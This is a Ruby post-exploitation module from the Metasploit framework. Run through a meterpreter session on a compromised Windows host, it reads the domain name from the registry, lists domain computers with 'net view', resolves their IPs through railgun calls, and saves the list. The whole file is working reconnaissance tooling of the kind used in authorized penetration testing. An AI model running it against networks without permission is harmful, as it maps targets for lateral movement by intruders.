##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
        'Name'         => 'Windows Gather Enumerate Computers',
        'Description'  => %q{
            This module will enumerate computers included in the primary Domain.
        },
        'License'      => MSF_LICENSE,
        'Author'       => [ 'Joshua Abraham <jabra[at]rapid7.com>'],
        'Platform'     => [ 'win'],
        'SessionTypes' => [ 'meterpreter' ]
      ))
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
    domain = get_domain()

    if not domain.empty?
      hostname_list = get_domain_computers()
      list_computers(domain, hostname_list)
    end
  end

  def gethost(hostname)
    hostip = nil
    if client.platform =~ /^x64/
      size = 64
      addrinfoinmem = 32
    else
      size = 32
      addrinfoinmem = 24
    end

    ## get IP for host
    begin
      vprint_status("Looking up IP for #{hostname}")
      result = client.railgun.ws2_32.getaddrinfo(hostname, nil, nil, 4 )
      if result['GetLastError'] == 11001
        return nil
      end
      addrinfo = client.railgun.memread( result['ppResult'], size )
      ai_addr_pointer = addrinfo[addrinfoinmem,4].unpack('L').first
      sockaddr = client.railgun.memread( ai_addr_pointer, size/2 )
      ip = sockaddr[4,4].unpack('N').first
      hostip = Rex::Socket.addr_itoa(ip)
    rescue ::Exception => e
      print_error(e)
    end

    return hostip
  end

  # List Members of a domain group
  def get_domain_computers()
    computer_list = []
    devisor = "-------------------------------------------------------------------------------\r\n"
    raw_list = client.shell_command_token("net view").split(devisor)[1]
    if raw_list =~ /The command completed successfully/
      raw_list.sub!(/The command completed successfully\./,'')
      raw_list.gsub!(/\\\\/,'')
      raw_list.split(" ").each do |m|
        computer_list << m
      end
    end

    return computer_list
  end

  # Gets the Domain Name
  def get_domain()
    domain = ""
    begin
      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
      v_name = "DCName"
      domain_dc = registry_getvaldata(subkey, v_name)
      dom_info =  domain_dc.split('.')
      domain = dom_info[1].upcase
    rescue
      print_error("This host is not part of a domain.")
    end
    return domain
  end

  def list_computers(domain,hosts)
    tbl = Rex::Ui::Text::Table.new(
      'Header'  => "List of Domain Hosts for the primary Domain.",
      'Indent'  => 1,
      'Columns' =>
      [
        "Domain",
        "Hostname",
        "IPs",
      ])
    hosts.each do |hostname|
      hostip = gethost(hostname)
      tbl << [domain,hostname,hostip]
    end
    results = tbl.to_s
    print_line("\n" + results + "\n")

    report_note(
      :host => session,
      :type => 'domain.hosts',
      :data => tbl.to_csv
    )
  end
end
